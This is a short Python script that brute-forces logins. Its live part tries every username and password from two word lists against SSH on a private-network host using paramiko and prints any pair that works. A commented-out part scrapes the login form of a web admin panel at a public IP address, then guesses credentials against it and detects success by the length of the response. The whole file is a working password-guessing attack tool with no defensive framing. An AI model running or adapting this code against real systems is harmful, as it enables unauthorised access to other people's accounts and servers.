import requests
from bs4 import BeautifulSoup
import paramiko

for u in open('users.txt','r').readlines():
    u = u.replace('\n','')
    for p in open('pwd.txt','r').readlines():
        p = p.replace('\n','')
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname='192.168.172.129', port=22, username=u, password=p)
            print(u,p)
            break
        except:
            pass



# url = 'http://39.104.63.123/admindm-yourname/mod_common/login.php'
# res = requests.get(url,verify=False).text
# soup = BeautifulSoup(res,'html.parser')
#
# action = soup.find('form').get('action')
# print(action)
# if action[-1] == '/':
#     action = action[:-2]
# url1 = url.split('/')
# url1[-1] = action
# login_url = '/'.join(url1)
# print(login_url)
# all_input = soup.find_all('input')
# uname = ''
# pwd = ''
# for i in all_input:
#     if i.get('name').find('u') == 0:
#         uname = i.get('name')
#     if i.get('name').find('p') == 0:
#         pwd = i.get('name')
# num = 0
# res_count = 0
# for u in open('users.txt','r').readlines():
#     u = u.replace('\n','')
#     for p in open('pwd.txt','r').readlines():
#         p = p.replace('\n','')
#         head = {
#             'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
#         }
#         payload = {
#             uname:u,
#             pwd:p
#         }
#         login_res = requests.post(url=login_url,data=payload).text
#         print(login_res)
#         if num == 0:
#             res_count = len(login_res)
#             num = num +1
#         if len(login_res) > res_count + 5 or len(login_res) < res_count:
#             print(u,p)
#             break